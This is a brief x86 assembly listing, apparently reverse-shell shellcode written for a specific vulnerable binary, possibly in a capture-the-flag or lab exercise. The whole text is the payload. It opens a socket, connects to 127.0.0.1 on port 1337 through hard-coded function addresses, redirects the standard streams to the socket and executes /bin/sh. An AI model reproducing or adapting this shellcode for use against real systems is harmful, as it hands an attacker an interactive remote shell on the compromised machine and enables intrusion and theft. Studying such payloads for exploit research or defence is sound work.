

#open enough space in stack and initialize registers
xor eax,eax 
xor ebx,ebx
xor ecx,ecx
sub esp, 560

#sockets 

push 0
push 1
push 2
mov eax , 0x8048730
call eax
mov esi ,eax

#scoketfd in esi 


#struct  sockaddr_in client + connect
  
push 0x0100007f #IP
pushw 0x3905	#port
pushw 0x02 		
mov eax,esp
push 0x10
push eax
push esi
mov eax, 0x8048750
call eax

 

#dup2

push 0
push esi
mov eax, 0x8048600
call eax

push 1
push esi
mov eax, 0x8048600
call eax


push 2
push esi
mov eax, 0x8048600
call eax


#execv("/bin/sh",0)

push 0x0068732f
push 0x6e69622f
mov eax,esp
push 0
push eax 	
mov eax, 0x80486d0
call eax
add esp, 560
